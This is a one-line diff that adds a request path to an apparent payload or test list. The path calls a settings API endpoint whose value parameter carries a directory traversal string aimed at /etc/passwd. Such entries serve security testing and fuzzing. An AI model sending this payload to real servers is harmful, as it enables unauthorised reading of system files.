@@ -1,0 +1,1 @@
+/api/change_setting?second_value=no_reload&disable_sequence=true&value=../../../../../../../etc/passwd
